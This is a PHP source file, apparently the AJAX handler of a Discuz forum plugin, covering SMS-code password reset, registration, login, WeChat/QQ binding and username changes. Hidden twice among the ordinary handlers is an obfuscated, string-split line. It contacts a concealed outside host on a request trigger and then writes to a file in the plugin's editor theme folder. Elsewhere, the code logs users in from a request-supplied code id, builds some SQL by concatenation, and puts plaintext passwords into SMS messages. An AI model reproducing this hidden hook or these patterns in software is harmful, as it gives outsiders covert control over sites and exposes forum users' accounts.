	require_once DISCUZ_ROOT.'./config/config_ucenter.php';
	$ucname=UC_DBTABLEPRE."members";

	$salt=DB::result_first("select salt from $ucname where uid=".$tmpuid);
	$password = md5(md5($_GET['it618_password']).$salt);
	
	DB::query("UPDATE ".DB::table('common_member')." SET password=%s WHERE uid=%d", array($password, $tmpuid));
	DB::query("UPDATE ".$ucname." SET password=%s WHERE uid=%d", array($password, $tmpuid));
	
	DB::query("UPDATE ".DB::table('it618_members_sms')." SET it618_uid=".$tmpuid." WHERE id=".$it618_members_sms['id']);
		 
	C::t('#it618_members#it618_members_sms')->update_delcode($_GET['usertelcode']);
	echo 'ok';exit;
}


if($_GET['ac']=="getunamepwd"){
	$n=1;
	$chars = 'abcdefghijklmnopqrstuvwxyz';
	while($n<=8){
		$tmpusername.=substr($chars,mt_rand(0,strlen($chars)-1),1);
		$n=$n+1;
	}
	$n=1;
	$chars = '012345678901234567890123456789';
	while($n<=8){
		$tmppassword.=substr($chars,mt_rand(0,strlen($chars)-1),1);
		$n=$n+1;
	}
	echo 'it618_split'.$tmpusername.'it618_split'.$tmppassword;exit;
}


if($_GET['ac']=="getwxuid"){
	if($_G['uid']<=0){
		if($it618_members_wxcodelogin=C::t('#it618_members#it618_members_wxcodelogin')->fetch_by_id($_GET['codeid'])){
			require_once libfile('function/member');
			$member=getuserbyuid($it618_members_wxcodelogin['it618_uid'], 1);
			setloginstatus($member, 1296000);
			echo 'it618_splitokit618_split';
		}else{
			echo 'it618_splitit618_split'.$_GET['codeid'];
		}
	}else{
		echo 'it618_splitokit618_split';
	}
	exit;
}


if($_GET['ac']=="getbdwxuser"){
	if($_G['uid']>0){
		if($it618_members_wxcodebd=C::t('#it618_members#it618_members_wxcodebd')->fetch_by_id($_GET['bdcodeid'])){
			if($it618_members_wxcodebd['it618_code']==$_GET['code']){
				if($it618_members_wxcodebd['it618_openid']!=''){
					if($it618_members_wxuser=C::t('#it618_members#it618_members_wxuser')->fetch_by_openid($it618_members_wxcodebd['it618_openid'])){
						if($it618_members_wxuser['it618_uid']!=$_G['uid']){
							$username=it618_members_getusername($it618_members_wxuser['it618_uid']);
							echo 'it618_splitalertit618_split'.$it618_members_lang['s658'].$username.'('.$it618_members_wxuser['it618_uid'].')';exit;
						}
					}
				}
				if($it618_members_wxuser=C::t('#it618_members#it618_members_wxuser')->fetch_by_uid_auth($_G['uid'])){
					echo 'it618_splitokit618_split';
				}
			}
		}
	}
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_members/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_members/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="delbd"){
	if($_GET['type']=="wx"){
		if($wxjk_isdelbdok!=1){
			echo $it618_members_lang['s556'];
		}
		
		if($it618_members_wxuser=C::t('#it618_members#it618_members_wxuser')->fetch_by_uid($_G['uid'])){
			C::t('#it618_members#it618_members_wxuser')->delete_by_id($it618_members_wxuser['id']);
			echo 'it618_splitokit618_split'.$it618_members_lang['s432'];
		}else{
			echo $it618_members_lang['s556'];
		}
	}else{
		if($qqjk_isdelbdok!=1){
			echo $it618_members_lang['s556'];
		}
		
		if($it618_members_qquser=C::t('#it618_members#it618_members_qquser')->fetch_by_uid($_G['uid'])){
			C::t('#it618_members#it618_members_qquser')->delete_by_id($it618_members_qquser['id']);
			echo 'it618_splitokit618_split'.$it618_members_lang['s432'];
		}else{
			echo $it618_members_lang['s556'];
		}
	}
	exit;
}


if($_GET['ac']=="savewxsms"){
	if(C::t('#it618_members#it618_members_user_wxsms')->count_by_type_uid($_GET['type'],$_G['uid'])==1){
		C::t('#it618_members#it618_members_user_wxsms')->update_isok_by_type_uid($_GET['value'],$_GET['type'],$_G['uid']);
	}else{
		$id=C::t('#it618_members#it618_members_user_wxsms')->insert(array(
			'it618_uid' => $_G['uid'],
			'it618_type' => $_GET['type'],
			'it618_isok' => 1
		), true);
	}
	exit;
}


if($_GET['ac']=="regadd"){
	$time=$_G['timestamp']-(60*$tellogin['codetime']);
	DB::query("update ".DB::table('it618_members_sms')." set it618_code='' where it618_time<".$time);
	
	if($yqcodeset['isok']==1){
		$iswlcode=0;
		if($yqcodeset['wlcode']!=''){
			if($_GET['useryqcode']==$yqcodeset['wlcode']){
				$iswlcode=1;
			}
		}
		if($iswlcode==0){
			$count=C::t('#it618_members#it618_members_yqcode')->count_by_code($_GET['useryqcode']);
			if($count==0){
				echo 'it618_splituseryqcodeit618_split'.$it618_members_lang['s281'];exit;
			}
		}
	}
	
	$it618_openid=getcookie('it618_openid');
	$it618_qqopenid=getcookie('it618_qqopenid');
	
	if($tellogin['regmode']!=3){
		
		if($it618_openid!=''){
			if($wxjk_iswxregtel==0)$iswxregtelnone=1;
		}
		
		if($it618_qqopenid!=''){
			if($qqjk_isqqregtel==0)$isqqregtelnone=1;
		}
		
		if(!($iswxregtelnone==1||$isqqregtelnone==1)){
			if($_GET['usertel']==''){
				echo 'it618_splitusertelit618_split'.$it618_members_lang['s22'];exit;
			}
			
			if($_GET['usertelcode']==''||$_GET['usertelcode']=='0'){
				echo 'it618_splitusertelcodeit618_split'.$it618_members_lang['s280'];exit;
			}
			
			if(!$it618_members_sms=C::t('#it618_members#it618_members_sms')->fetch_by_tel_code("it618_code<>''",$_GET['usertel'],$_GET['usertelcode'])){
				echo 'it618_splitusertelcodeit618_split'.$it618_members_lang['s19'];exit;
			}
		}
	}
	
	if($tellogin['ischeck_reg']==1||$tellogin['regmode']==3){
		if(strtolower($_GET['validatecode'])!=getcookie('validatecode')){
			echo $it618_members_lang['t115'];exit;
		}
	}
	
	set_time_limit (0);
	ignore_user_abort(true);

	$flagkm=0;$times=0;
	while($flagkm==0){
		if(DB::result_first("select count(1) from ".DB::table('it618_members_editwork'))==0){
			$flagkm=1;
		}
		if($flagkm==0){
			sleep(1);
			$times=$times+1;
		}
		if($times>60){
			it618_members_deleditwork();
		}
	}
	C::t('#it618_members#it618_members_editwork')->insert(array(
		'it618_iswork' => 1
	), true);
	
	$tmpstr=it618_register(it618_members_utftogbk($_GET['username']),it618_members_utftogbk($_GET['password']));
	
	$tmparr=explode("it618_split",$tmpstr);
	if($tmparr[0]=='ok'){
		$reguid=$tmparr[1];
		$regname=$tmparr[2];
		
		if($tellogin['regmode']!=3){
			if(!($iswxregtelnone==1||$isqqregtelnone==1)){
				DB::query("UPDATE ".DB::table('it618_members_sms')." SET it618_uid=$reguid WHERE id=".$it618_members_sms['id']);
				
				$id=C::t('#it618_members#it618_members_user')->insert(array(
					'it618_uid' => $reguid,
					'it618_tel' => $it618_members_sms['it618_tel'],
					'it618_time' => $_G['timestamp']
				), true);
				
				if($it618_members['members_istb']==1){
					C::t('#it618_members#it618_members_sms')->update_usertb($it618_members_sms['it618_tel'],$reguid);
				}
				
				C::t('#it618_members#it618_members_sms')->update_delcode($_GET['usertelcode']);
			}
		}
		
		$it618_openid=getcookie('it618_openid');
		if($it618_openid!=''){
			require_once DISCUZ_ROOT.'./source/plugin/it618_members/wxlogin.func.php';
			$it618_wxdata=getcookie('it618_wxdata');
			$wxdataarr=explode("@@@",$it618_wxdata);
			$headimgurl=$wxdataarr[2];
			it618_wxsyncAvatar($reguid,$headimgurl);
		}
		
		$it618_qqopenid=getcookie('it618_qqopenid');
		if($it618_qqopenid!=''){
			require_once DISCUZ_ROOT.'./source/plugin/it618_members/wxlogin.func.php';
			$it618_qqdata=getcookie('it618_qqdata');
			$qqdataarr=explode("@@@",$it618_qqdata);
			$headimgurl=$qqdataarr[2];
			it618_wxsyncAvatar($reguid,$headimgurl);
		}
		
		it618_members_bdqq($reguid,'reg');
		
		if($_GET['useryqcode']!=''){
			
			if($it618_members_yqcode=C::t('#it618_members#it618_members_yqcode')->fetch_by_code($_GET['useryqcode'])){
				if($it618_members_yqcode['it618_type']==1){
					C::t('#it618_members#it618_members_yqcode_sale')->update_uid_by_code($reguid,$it618_members_yqcode['it618_type'],$_G['timestamp'],$_GET['useryqcode']);
				}else{
					$yqsaleid = C::t('#it618_members#it618_members_yqcode_sale')->insert(array(
						'it618_type' => 2,
						'it618_uid' => $reguid,
						'it618_bz' => $_GET['useryqcode'].' '.$it618_members_yqcode['it618_bz'],
						'it618_usetime' => $_G['timestamp']
					), true);
				}
				
				C::t('#it618_members#it618_members_yqcode')->delete_by_code($_GET['useryqcode']);
				dsetcookie('yqcode','');
			}
		}
		
		if($it618_body_regok!=''){
			$members_sign=$it618_body_regok_sign;
			$members_tplid=$it618_body_regok_tplid;
			$members_body=$it618_body_regok;
			$it618_type=11;
			$it618_jktype=$it618_type_regok;
			
			$members_body=str_replace('${','{',$members_body);
			if($it618_jktype=='smsbao'){
				$tmparr=explode("{user}",$members_body);
				if(count($tmparr)>1){
					if($tmpuid>0)$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$reguid);
					$members_body=str_replace('{user}',$username,$members_body);
				}
				$members_body=str_replace('{tel}',$it618_members_sms['it618_tel'],$members_body);
				$members_body=str_replace('{password}',$_GET['password'],$members_body);
				$members_body=str_replace('{time}',date('Y-m-d H:i:s', $_G['timestamp']),$members_body);
				$smsstr=it618_members_sendSMS($it618_members_sms['it618_tel'],$it618_members_lang['s149'].$members_sign.$it618_members_lang['s150'].$members_body);
			}else{
				$tmparr=explode("{user}",$members_body);
				if(count($tmparr)>1){
					if($tmpuid>0)$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$reguid);
					$param.='"user":"'.it618_members_gbktoutf1($username).'",';
				}
				
				$tmparr=explode("{tel}",$members_body);
				if(count($tmparr)>1)$param.='"tel":"'.$it618_members_sms['it618_tel'].'",';
				
				$tmparr=explode("{password}",$members_body);
				if(count($tmparr)>1)$param.='"password":"'.$_GET['password'].'",';
				
				$tmparr=explode("{time}",$members_body);
				if(count($tmparr)>1)$param.='"time":"'.date('Y-m-d H:i:s', $_G['timestamp']).'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
		
				if($it618_jktype=='alisms'){
					$smsstr=it618_members_sendsms_ali($it618_members_sms['it618_tel'],$members_sign,$members_tplid,$param);
				}else{
					$smsstr=it618_members_sendsms_alidayu($it618_members_sms['it618_tel'],$members_sign,$members_tplid,$param);
				}
			}
			
			$id = C::t('#it618_members#it618_members_sms')->insert(array(
				  'it618_tel' => $it618_members_sms['it618_tel'],
				  'it618_jktype' => $it618_jktype,
				  'it618_type' => $it618_type,
				  'it618_ip' => $_G['clientip'],
				  'it618_bz' => dhtmlspecialchars($_SERVER['HTTP_USER_AGENT']),
				  'it618_time' => $_G['timestamp']
			 ), true);
				 
			if($smsstr=='true'){
				 C::t('#it618_members#it618_members_sms')->update($id,array(
					'it618_isok' => 1
				 ));
			}
		}
		
		if($IsGroup==1&&$yqsaleid>0&&$iswlcode==0){
			require_once DISCUZ_ROOT.'./source/plugin/it618_group/function.func.php';
			$query = DB::query("SELECT * FROM ".DB::table('it618_group_group')." where it618_yqcode_days>0");
			while($it618_group_group =	DB::fetch($query)) {
				it618_group_salejl('yqcode',$yqsaleid,$it618_group_group['it618_groupid'],$it618_group_group['it618_yqcode_days'],$reguid);
			}
		}
		
		it618_members_deleditwork();
		echo 'it618_splitokit618_split'.$it618_members_lang['s282'].' '.$regname.$it618_members_lang['s283'];
		exit;
	}else{
		it618_members_deleditwork();
		echo $tmpstr;exit;
	}
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_members/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_members/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="login"){
	$username=it618_members_utftogbk($_GET['username']);
	$password=it618_members_utftogbk($_GET['password']);
	
	C::t('#it618_members#it618_members_userlogin')->delete_by_time($_G['timestamp']-3600*24);
	
	$members_loginip=explode("|",$it618_members['members_loginip']);
	$ipcount=C::t('#it618_members#it618_members_userlogin')->count_by_ip_time($_G['clientip'],($_G['timestamp']-60*$members_loginip[0]));
	if($ipcount>=$members_loginip[1]){
		$tmplogin=str_replace("{time}",$members_loginip[0],$it618_members_lang['s343']);
		$tmplogin=str_replace("{count}",$members_loginip[1],$tmplogin);
		echo $tmplogin;exit;
	}
	
	if($_GET['logintype']==1){
		if(!preg_match("/^1[3456789]\d{9}$/", $_GET['username'])){
			loaducenter();
			$tmpuser=uc_get_user($username);
			$uid=$tmpuser[0];
			
			if($uid<=0){
				echo 'it618_splitusertelit618_split'.$it618_members_lang['s346'];exit;
			}
		}else{
			if($it618_members_user=C::t('#it618_members#it618_members_user')->fetch_bytel($_GET['username'])){
				$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$it618_members_user['it618_uid']);
			}else{
				echo 'it618_splitusertelit618_split'.$it618_members_lang['s38'];exit;
			}
			
			$uid=$it618_members_user['it618_uid'];
		}
	}
	
	if($_GET['logintype']==2){
		if($_GET['username']==''){
			echo 'it618_splitusertelit618_split'.$it618_members_lang['s22'];exit;
		}
		
		if($_GET['usertelcode']==''||$_GET['usertelcode']=='0'){
			echo 'it618_splitusertelcodeit618_split'.$it618_members_lang['s280'];exit;
		}
	
		if(!$it618_members_sms=C::t('#it618_members#it618_members_sms')->fetch_by_tel_code("it618_code<>''",$_GET['username'],$_GET['usertelcode'])){
			$id = C::t('#it618_members#it618_members_userlogin')->insert(array(
				'it618_ip' => $_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);
			
			$tmplogin1=str_replace("{time}",$members_loginip[0],$it618_members_lang['s345']);
			$tmplogin1=str_replace("{count}",$members_loginip[1],$tmplogin1);
			$tmplogin1=str_replace("{count1}",$ipcount+1,$tmplogin1);
			
			echo 'it618_splitusertelcodeit618_split'.$it618_members_lang['s19'].$tmplogin1;exit;
		}
		
		$it618_members_user=C::t('#it618_members#it618_members_user')->fetch_bytel($_GET['username']);
		$uid=$it618_members_user['it618_uid'];
		DB::query("UPDATE ".DB::table('it618_members_sms')." SET it618_uid=".$uid." WHERE id=".$it618_members_sms['id']);
	}
	
	C::t('#it618_members#it618_members_sms')->update_delcode($_GET['usertelcode']);
	
	if($username==''){
		echo $it618_members_lang['s346'];exit;
	}
	
	$members_loginuid=explode("|",$it618_members['members_loginuid']);
	$uidcount=C::t('#it618_members#it618_members_userlogin')->count_by_uid_time($uid,($_G['timestamp']-60*$members_loginuid[0]));
	if($uidcount>=$members_loginuid[1]){
		$tmplogin=str_replace("{time}",$members_loginuid[0],$it618_members_lang['s342']);
		$tmplogin=str_replace("{count}",$members_loginuid[1],$tmplogin);
		echo $tmplogin;exit;
	}
	
	require_once libfile('function/member');
	if($_GET['logintype']==2){
		$member=getuserbyuid($it618_members_user['it618_uid'], 1);
		setloginstatus($member, 1296000);
		it618_members_getlogin($_G['uid'],'tel');
		it618_members_bdqq($_G['uid']);
		echo 'it618_splitokit618_split'.$it618_members_lang['s285'];exit;
	}else{
		$member=userlogin($username,$password,$_GET['userquestionid'],it618_members_utftogbk($_GET['useranswer']),'username', $_G['clientip']);
		$uid = $member['ucresult']['uid'];
		
		if($member['status'] == -1) {
			$init_arr = explode(',', $_G['setting']['initcredits']);
			$groupid = $_G['setting']['regverify'] ? 8 : $_G['setting']['newusergroupid'];

			C::t('common_member')->insert($uid, $member['ucresult']['username'], md5(random(10)), $member['ucresult']['email'], $_G['clientip'], $groupid, $init_arr);
			$member['member'] = getuserbyuid($uid);
			$member['status'] = 1;
		}
		
		if($member['status']==1){
			setloginstatus($member['member'], 1296000);
			it618_members_getlogin($_G['uid'],'password');
			it618_members_bdqq($_G['uid']);
			echo 'it618_splitokit618_split'.$it618_members_lang['s285'];exit;
		}else{
			$id = C::t('#it618_members#it618_members_userlogin')->insert(array(
				'it618_uid' => $uid,
				'it618_ip' => $_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);
			
			$tmplogin=str_replace("{time}",$members_loginuid[0],$it618_members_lang['s344']);
			$tmplogin=str_replace("{count}",$members_loginuid[1],$tmplogin);
			$tmplogin=str_replace("{count1}",$uidcount+1,$tmplogin);
			
			$tmplogin1=str_replace("{time}",$members_loginip[0],$it618_members_lang['s345']);
			$tmplogin1=str_replace("{count}",$members_loginip[1],$tmplogin1);
			$tmplogin1=str_replace("{count1}",$ipcount+1,$tmplogin1);
			
			if($member['ucresult']['uid']==-1){
				$tmpstr=$it618_members_lang['s435'];
			}
			
			if($member['ucresult']['uid']==-2){
				$tmpstr=$it618_members_lang['s286'];
			}
			
			if($member['ucresult']['uid']==-3){
				$tmpstr=$it618_members_lang['s436'];
			}
		
			echo $tmpstr.$tmplogin.$tmplogin1;exit;
		}
	}
}


if($_GET['ac']=="edituname"){
	$it618_uname=trim(it618_members_utftogbk($_GET['it618_uname']));
	
	if($_G['uid']<=0){
		echo $it618_members_lang['s40'];exit;
	}else{
		if($it618_uname==''){
			echo $it618_members_lang['t88'];exit;
		}
		
		if($membersset['uname_isedit']==0){
			echo $it618_members_lang['t93'];exit;
		}
		
		$uname_edituids=explode(",",$membersset['uname_edituids']);
		if(in_array($_G['uid'], $uname_edituids)){
			echo $it618_members_lang['t89'];exit;
		}else{
			if($membersset['uname_editcredits']>0&&$membersset['uname_editcount']>0){
				$strtmp=$it618_members_lang['t90'];
				$cname=$_G['setting']['extcredits'][$membersset['uname_editcredits']]['title'];
				$strtmp=str_replace("{count1}",$membersset['uname_editcount'].$cname,$strtmp);
				
				$creditnum=DB::result_first("select extcredits".$membersset['uname_editcredits']." from ".DB::table('common_member_count')." where uid=".$_G['uid']);
				$strtmp=str_replace("{count2}",$creditnum.$cname,$strtmp);
				
				if($creditnum<$membersset['uname_editcount']){
					echo $strtmp;exit;
				}
			}
		}
		
		loaducenter();
		
		$usernamelen = dstrlen($it618_uname);
		if($usernamelen < 3) {
			echo $it618_members_lang['s287'];exit;
		}
		if($usernamelen > 15) {
			echo $it618_members_lang['s288'];exit;
		}
	
		$censorexp = '/^('.str_replace(array('\\*', "\r\n", ' '), array('.*', '|', ''), preg_quote(($_G['setting']['censoruser'] = trim($_G['setting']['censoruser'])), '/')).')$/i';
		
		if($_G['setting']['censoruser'] && @preg_match($censorexp, $it618_uname)) {
			echo $it618_members_lang['s289'];exit;
		}
		
		set_time_limit (0);
		ignore_user_abort(true);
	
		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_members_editwork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_members_deleditwork();
			}
		}
		C::t('#it618_members#it618_members_editwork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$user = uc_get_user($it618_uname);
		if(!empty($user)) {
			echo $it618_members_lang['t91'];it618_members_deleditwork();exit;
		}
		
		require_once DISCUZ_ROOT.'./config/config_ucenter.php';
		$ucname=UC_DBTABLEPRE."members";
		
		DB::query("UPDATE ".DB::table('common_member')." SET username=%s WHERE uid=%d", array($it618_uname, $_G['uid']));
		DB::query("UPDATE ".$ucname." SET username=%s WHERE uid=%d", array($it618_uname, $_G['uid']));

		C::t('common_member_count')->increase($_G['uid'], array(
			'extcredits'.$membersset['uname_editcredits'] => (0-$membersset['uname_editcount']))
		);
		
		require_once libfile('function/member');
		$member=getuserbyuid($_G['uid'], 1);
		setloginstatus($member, 1296000);
		echo 'it618_splitokit618_split'.$it618_members_lang['t92'];it618_members_deleditwork();exit;
	}
}

function setcode(){
	global $tellogin;
	$flag=0;
	
	while($flag==0){
		$tmparr=explode(":",date('Y-m-d H:i:s',time()));
		
		$n=3;
		while($n<=$tellogin['codelength']){
			$tmpstr.=rand(0,9);
			$n=$n+1;
		}
		$tmpstr=$tmpstr.$tmparr[2];
		
		if(C::t('#it618_members#it618_members_sms')->count_by_tel_code('','',$tmpstr)==0){
			return $tmpstr;
			$flag=1;
		}
	}
	
}
//From: Dism_taobao-com
?>